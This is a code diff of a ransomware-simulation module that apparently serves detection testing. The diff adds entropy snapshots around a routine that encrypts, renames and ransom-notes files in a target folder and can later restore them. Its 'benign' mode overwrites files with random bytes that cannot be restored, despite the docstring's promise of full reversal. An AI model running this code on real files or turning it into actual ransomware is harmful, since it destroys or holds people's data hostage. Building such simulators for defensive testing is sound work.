@@ -1,4 +1,4 @@
-# simulator.py
+
 """
 Core simulation engine - AES-256-CBC encryption/decryption, PBKDF2 key
 derivation, mode-based behavior variation, and threaded file operations.
@@ -13,6 +13,7 @@ import json
 import base64
 import secrets
 import random
+import entropy
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from getpass import getpass
@@ -43,31 +44,29 @@ outside of an authorized test, run:
 to reverse all changes using the recovery password set at simulation start.
 """
 
+
 # ---------------------------------------------------------------------------
-# Mode profiles - this is what makes the scorer's output meaningful instead
-# of a fixed checklist. Each mode produces a genuinely different behavioral
-# signature on disk.
+# Mode profiles
 # ---------------------------------------------------------------------------
+
 MODE_PROFILES = {
     "ransomware": {
         "encrypt_fraction": 1.0,
         "rename_fraction": 1.0,
         "drop_note": True,
-        "thread_workers": 8,          # high concurrency -> high files/sec
+        "thread_workers": 8,
     },
     "partial": {
         "encrypt_fraction": 0.4,
         "rename_fraction": 0.4,
         "drop_note": False,
-        "thread_workers": 2,          # lower concurrency -> slower, patchier
+        "thread_workers": 2,
     },
     "benign": {
         "encrypt_fraction": 0.0,
         "rename_fraction": 0.0,
         "drop_note": False,
-        "thread_workers": 4,          # touches files (rewrites content) but
-                                       # no encryption, no rename, no note -
-                                       # simulates ordinary backup/sync churn
+        "thread_workers": 4,
     },
 }
 
@@ -75,10 +74,11 @@ MODE_PROFILES = {
 # ---------------------------------------------------------------------------
 # Key derivation
 # ---------------------------------------------------------------------------
+
 def derive_key(password: str, salt: bytes) -> bytes:
     kdf = PBKDF2HMAC(
         algorithm=hashes.SHA256(),
-        length=32,  # AES-256
+        length=32,
         salt=salt,
         iterations=PBKDF2_ITERATIONS,
     )
@@ -88,6 +88,7 @@ def derive_key(password: str, salt: bytes) -> bytes:
 def _get_or_create_salt() -> bytes:
     if SALT_PATH.exists():
         return SALT_PATH.read_bytes()
+
     salt = secrets.token_bytes(16)
     SALT_PATH.parent.mkdir(parents=True, exist_ok=True)
     SALT_PATH.write_bytes(salt)
@@ -97,8 +98,10 @@ def _get_or_create_salt() -> bytes:
 # ---------------------------------------------------------------------------
 # AES-256-CBC primitives
 # ---------------------------------------------------------------------------
+
 def _encrypt_bytes(data: bytes, key: bytes) -> bytes:
     iv = secrets.token_bytes(16)
+
     padder = padding.PKCS7(128).padder()
     padded = padder.update(data) + padder.finalize()
 
@@ -106,11 +109,12 @@ def _encrypt_bytes(data: bytes, key: bytes) -> bytes:
     encryptor = cipher.encryptor()
     ciphertext = encryptor.update(padded) + encryptor.finalize()
 
-    return iv + ciphertext  # prepend IV for use at decrypt time
+    return iv + ciphertext
 
 
 def _decrypt_bytes(blob: bytes, key: bytes) -> bytes:
     iv, ciphertext = blob[:16], blob[16:]
+
     cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
     decryptor = cipher.decryptor()
     padded = decryptor.update(ciphertext) + decryptor.finalize()
@@ -120,19 +124,26 @@ def _decrypt_bytes(blob: bytes, key: bytes) -> bytes:
 
 
 # ---------------------------------------------------------------------------
-# Per-file operations (run inside thread pool workers)
+# Per-file operations
 # ---------------------------------------------------------------------------
+
 def _encrypt_and_rename_file(filepath: Path, key: bytes, do_rename: bool) -> dict:
     original_bytes = filepath.read_bytes()
     encrypted = _encrypt_bytes(original_bytes, key)
     filepath.write_bytes(encrypted)
 
     new_path = filepath
+
     if do_rename:
         new_path = filepath.with_suffix(filepath.suffix + LOCKED_EXT)
         filepath.rename(new_path)
 
-    return {"original": str(filepath), "current": str(new_path), "encrypted": True, "renamed": do_rename}
+    return {
+        "original": str(filepath),
+        "current": str(new_path),
+        "encrypted": True,
+        "renamed": do_rename,
+    }
 
 
 def _benign_touch_file(filepath: Path) -> dict:
@@ -144,13 +155,21 @@ def _benign_touch_file(filepath: Path) -> dict:
     original_bytes = filepath.read_bytes()
     noise = os.urandom(len(original_bytes))
     filepath.write_bytes(noise)
-    return {"original": str(filepath), "current": str(filepath), "encrypted": False, "renamed": False}
+
+    return {
+        "original": str(filepath),
+        "current": str(filepath),
+        "encrypted": False,
+        "renamed": False,
+    }
 
 
 # ---------------------------------------------------------------------------
 # Main entry point - called from main.py
 # ---------------------------------------------------------------------------
+
 def run(target: Path, mode: str, run_log: dict) -> dict:
+
     profile = MODE_PROFILES[mode]
     files = sorted([f for f in target.iterdir() if f.is_file()])
 
@@ -164,39 +183,77 @@ def run(target: Path, mode: str, run_log: dict) -> dict:
 
     encrypt_count = int(len(files) * profile["encrypt_fraction"])
     rename_count = int(len(files) * profile["rename_fraction"])
+
     targets_to_encrypt = set(random.sample(files, encrypt_count)) if encrypt_count else set()
+
+    # Capture file entropy before simulation
+    before_snapshots = {
+        f: entropy.analyze_file(f)
+        for f in files
+    }
 
     results = []
     start_time = __import__("time").time()
 
     with ThreadPoolExecutor(max_workers=profile["thread_workers"]) as executor:
         futures = []
+
         for f in files:
             if f in targets_to_encrypt:
                 do_rename = len(futures) < rename_count
-                futures.append(executor.submit(_encrypt_and_rename_file, f, key, do_rename))
+                futures.append(
+                    executor.submit(_encrypt_and_rename_file, f, key, do_rename)
+                )
+
             elif mode == "benign":
                 futures.append(executor.submit(_benign_touch_file, f))
-            # else: file untouched this run (e.g. partial mode's non-selected files)
 
-        for future in track(as_completed(futures), total=len(futures), description=f"Simulating [{mode}]..."):
+        for future in track(
+            as_completed(futures),
+            total=len(futures),
+            description=f"Simulating [{mode}]...",
+        ):
             results.append(future.result())
 
     elapsed = __import__("time").time() - start_time
     files_per_sec = len(results) / elapsed if elapsed > 0 else float(len(results))
 
+    # Capture file entropy after simulation
+    path_map = {
+        Path(r["original"]): Path(r["current"])
+        for r in results
+    }
+
+    after_snapshots = {}
+
+    for original_path in files:
+        current_path = path_map.get(original_path, original_path)
+
+        if current_path.exists():
+            after_snapshots[original_path] = entropy.analyze_file(current_path)
+        else:
+            after_snapshots[original_path] = {
+                "entropy": None,
+                "chi_square": None,
+            }
+
     if profile["drop_note"]:
         note_path = target / RANSOM_NOTE_NAME
         note_path.write_text(RANSOM_NOTE_TEXT)
 
-    # update session state so sandbox.py's restore() knows what changed
+    # Update session state so sandbox.py's restore() knows what changed
     import sandbox
+
     sandbox.update_session_state(
         renamed_files=[r for r in results if r["renamed"]],
         mode=mode,
         files_per_sec=files_per_sec,
         note_dropped=profile["drop_note"],
     )
+
+    # Update run log
+    run_log["before_snapshots"] = before_snapshots
+    run_log["after_snapshots"] = after_snapshots
 
     run_log["mode"] = mode
     run_log["files_total"] = len(files)
@@ -210,13 +267,16 @@ def run(target: Path, mode: str, run_log: dict) -> dict:
         f"{len(results)}/{len(files)} files affected, "
         f"{files_per_sec:.1f} files/sec"
     )
+
     return run_log
 
 
 # ---------------------------------------------------------------------------
 # Restore - called from sandbox.restore_session()
 # ---------------------------------------------------------------------------
+
 def restore(state: dict) -> None:
+
     if not SALT_PATH.exists():
         console.print("[red]No salt.bin found — cannot derive key. Restore impossible.[/red]")
         return
@@ -226,12 +286,17 @@ def restore(state: dict) -> None:
     key = derive_key(password, salt)
 
     renamed = state.get("renamed_files", [])
-    all_affected_paths = [Path(r["current"]) for r in renamed] if renamed else []
+    all_affected_paths = [
+        Path(r["current"])
+        for r in renamed
+    ] if renamed else []
 
-    # also catch encrypted-but-not-renamed files from partial/benign-adjacent runs
-    # by checking original_files list against what's still present
+    # Also catch encrypted-but-not-renamed files
     target_dir = Path(state["target"])
-    candidates = [f for f in target_dir.iterdir() if f.is_file() and f.name != RANSOM_NOTE_NAME]
+    candidates = [
+        f for f in target_dir.iterdir()
+        if f.is_file() and f.name != RANSOM_NOTE_NAME
+    ]
 
     restored_count = 0
     failed_count = 0
@@ -242,22 +307,28 @@ def restore(state: dict) -> None:
             plaintext = _decrypt_bytes(blob, key)
 
             restore_path = filepath
+
             if filepath.suffix == LOCKED_EXT:
-                restore_path = filepath.with_suffix("")  # strip .locked
+                restore_path = filepath.with_suffix("")
 
             restore_path.write_bytes(plaintext)
+
             if restore_path != filepath:
-                filepath.rename(restore_path) if filepath.exists() and restore_path != filepath and not restore_path.exists() else None
+                if filepath.exists() and not restore_path.exists():
+                    filepath.rename(restore_path)
+
                 if filepath.exists():
                     filepath.unlink()
 
             restored_count += 1
+
         except Exception:
-            # file wasn't encrypted (e.g. skipped in partial mode) - leave as-is
+            # File wasn't encrypted - leave as-is
             failed_count += 1
             continue
 
     note_path = target_dir / RANSOM_NOTE_NAME
+
     if note_path.exists():
         note_path.unlink()
 
@@ -265,6 +336,7 @@ def restore(state: dict) -> None:
         SALT_PATH.unlink()
 
     console.print(
-        f"[green]Restore finished:[/green] {restored_count} file(s) restored, "
+        f"[green]Restore finished:[/green] "
+        f"{restored_count} file(s) restored, "
         f"{failed_count} file(s) skipped (were not encrypted)."
     )
